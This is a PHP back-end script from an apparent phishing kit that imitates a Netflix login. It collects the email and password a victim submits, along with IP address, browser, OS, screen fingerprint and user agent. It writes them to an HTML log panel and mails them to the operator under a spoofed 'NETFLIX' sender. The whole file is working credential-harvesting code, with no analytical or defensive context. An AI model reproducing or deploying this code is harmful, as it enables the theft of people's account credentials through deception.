<?php
/*
SUPER D
*/
@ini_set('display_errors', 'on');
require 'detect.php';
include '../../config.php';
$IP = getenv("REMOTE_ADDR");$date = date("d M, Y");$times = date("g:i a");$code = $_SESSION['ip_countryCode']=clientData('code');$country = strtolower($code);
if(isset($_POST['eml'])&&isset($_POST['pss'])){session_start();
$usern=$_POST['eml'];$passw=$_POST['pss'];$screen=$_POST['screen'];$brow = $_SESSION['browser'];$sys = $_SESSION['os'];$useragent = $_SERVER['HTTP_USER_AGENT'];
$msg= "
[+]━━━━━━━━━━━━━【🔑 login】━━━━━━━━━━━━━━━━━[+]
[👤 user]  = ".$usern."
[👤 pass]  = ".$passw."
[+]━━━━━━━━━━━━━【💻 System】━━━━━━━━━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP=".$IP."
[⏰ TIME/DATE] =".$times." / ".$date."
[🌐 BROWSER] = ".$brow." and ".$sys."
[🖖 FINGERPRINT] = ".$screen." and ".$useragent." ";

$msght = "<tr>
<td width='80'>
<p align='center'><img src='".$_SESSION['ip_countryCode']."'>  " . $IP . "</th>
<td width='80'>
<p align='center'>" . $_POST['eml'] . "</th>
<td width='80'>
<p align='center'>" . $_POST['pss'] . "</th>
<td width='80'>
<p align='center'>" . $screen . " - " . $brow ." on " . $sys . "</th>
<td width='30'>
<p align='center'>" . $useragent . "</th>
<td width='60'>
<p align='center'>".$times." / ".$date."</th>
</font></th></tr>";		
$save=fopen("../panel/log" . $namerand . ".html", "a+");fwrite($save, $msght);fclose($save); 
$subject  = " [ NETFLIX LOGIN ] / ".$IP." / Super 'D' ";$headers = "From: NETFLIX\r\n";mail($yourmail, $subject, $msg, $headers);
}
?>